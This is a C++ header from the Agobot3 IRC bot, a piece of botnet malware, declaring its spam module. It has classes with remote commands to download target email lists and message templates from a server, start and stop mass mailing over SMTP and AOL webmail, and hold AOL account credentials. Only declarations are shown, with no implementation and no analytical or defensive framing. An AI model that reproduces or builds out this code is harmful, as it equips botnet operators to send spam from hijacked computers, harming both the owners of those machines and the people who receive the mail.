/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2003 Ago
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __SMTP_LOGIC_H__
#define __SMTP_LOGIC_H__

#include "cstring.h"
#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CSMTP_Logic : public CThread, public CCommandHandler
{
public:
						 CSMTP_Logic();									// Constructor
	virtual				~CSMTP_Logic();									// Destructor
	virtual void		*Run();											// Override for thread function

	void				 Init();										// Initialization

	bool				 HandleCommand(CMessage *pMsg);					// Command handler

	command				 m_cmdSetList, m_cmdSetTemplate, \
						 m_cmdStart, m_cmdStop;							// Commands
	cvar				 spam_maxthreads, spam_htmlemail;				// CVars
private:
	CString				 m_sListURL, m_sTemplateURL;					// List and template URL

	void				 SetList(CString &sURL);						// Set an email list to download from a server
	void				 SetTemplate(CString &sURL);					// Set an email template to download from a server

	list<CString>		 m_lEmails;										// The email list
	CString				 m_sEmailTemplate;								// The email template
	bool				 m_bSpamming;									// Am I spamming?
	bool				 m_bTemplateSet;								// Is the template set already?

	CString				 m_sEmailSrc;									// The source address of the email
	CString				 m_sEmailSrcFull;								// The full name of the sender
	CString				 m_sSubject;									// Subject
	CString				 m_sData;										// The text of the email
};

class CAOL_Logic : public CThread, public CCommandHandler
{
public:
						 CAOL_Logic();									// Constructor
	virtual				~CAOL_Logic();									// Destructor
	virtual void		*Run();											// Override for thread function

	void				 Init();										// Initialization

	bool				 HandleCommand(CMessage *pMsg);					// Command handler

	command				 m_cmdSetList, m_cmdSetTemplate, \
						 m_cmdSetUser, m_cmdSetPass, \
						 m_cmdStart, m_cmdStop;							// Commands
	cvar				 aolspam_maxthreads;							// CVars
private:
	CString				 m_sListURL, m_sTemplateURL;					// List and template URL
	CString				 m_sUser, m_sPass;								// User and password

	void				 SetList(CString &sURL);						// Set an email list to download from a server
	void				 SetTemplate(CString &sURL);					// Set an email template to download from a server
	void				 SetUser(CString &sUser);						// Set an username
	void				 SetPassword(CString &sPass);					// Set a password

	list<CString>		 m_lEmails;										// The email list
	CString				 m_sEmailTemplate;								// The email template
	bool				 m_bSpamming;									// Am I spamming?
	bool				 m_bTemplateSet;								// Is the template set already?

	CString				 m_sEmailSrc;									// The source address of the email
	CString				 m_sEmailSrcFull;								// The full name of the sender
	CString				 m_sSubject;									// Subject
	CString				 m_sData;										// The text of the email
};

class CAOLWebMail : public CThread
{
public:
						 CAOLWebMail();									// Constructor
	virtual				~CAOLWebMail();									// Destructor

	void				*Run();											// Override for thread function
	
	void				 Send();										// This sends the email
	void				 SetMail(	CString sMailFrom,					// Senders email address
									CString sMailFromFull,				// Senders full name
									CString sRcptTo,					// Receipients email address
									CString sSubject,					// Subject
									CString sData);						// Data to send in the mail

	bool				 m_bFinished;
	bool				 m_bMailSet;
private:
	CString				 m_sMailFrom;
	CString				 m_sMailFromFull;
	CString				 m_sRcptTo;
	CString				 m_sSubject;
	CString				 m_sData;
};

#endif // __SMTP_LOGIC_H__
